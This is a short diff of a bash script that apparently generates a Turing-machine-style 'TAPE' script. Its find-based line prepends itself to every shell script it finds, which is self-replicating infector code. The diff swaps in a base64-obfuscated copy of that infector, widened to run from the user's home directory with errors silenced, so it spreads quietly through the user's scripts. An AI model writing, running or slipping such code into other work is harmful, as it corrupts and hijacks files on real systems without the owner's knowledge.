@@ -1,6 +1,6 @@
 d=$PWD;find . -type f -exec bash -c "[ \"\$(file {}|grep -o 'shell')\" = \"shell\" ]&&{ cat \"$d/$0\"|head -1 > 0.tmp;cat \"{}\" >> 0.tmp;cat 0.tmp > \"{}\";rm 0.tmp;}" \;
 #!/bin/bash
-base64 -d<<<"ZD0kUFdEO2ZpbmQgLiAtdHlwZSBmIC1leGVjIGJhc2ggLWMgIlsgXCJcJChmaWxlIHt9fGdyZXAgLW8gJ3NoZWxsJylcIiA9IFwic2hlbGxcIiBdJiZ7IGNhdCBcIiRkLyQwXCJ8aGVhZCAtMSA+IDAudG1wO2NhdCBcInt9XCIgPj4gMC50bXA7Y2F0IDAudG1wID4gXCJ7fVwiO3JtIDAudG1wO30iIFw7Cg==" > "out.sh"
+base64 -d<<<"Y2Q7ZD0kUFdEO2ZpbmQgLiAtdHlwZSBmIC1leGVjIGJhc2ggLWMgIlsgXCJcJChmaWxlIHt9fGdyZXAgLW8gJ3NoZWxsJylcIiA9IFwic2hlbGxcIiBdJiZ7IGNhdCBcIiRkLyQwXCJ8aGVhZCAtMSA+IDAudG1wO2NhdCBcInt9XCIgPj4gMC50bXA7Y2F0IDAudG1wID4gXCJ7fVwiO3JtIDAudG1wO30iIFw7IDI+IC9kZXYvbnVsbCYKCg==" > "out.sh"
 echo "
 #!/bin/bash
 TAPE=( 0000 );HEAD=0
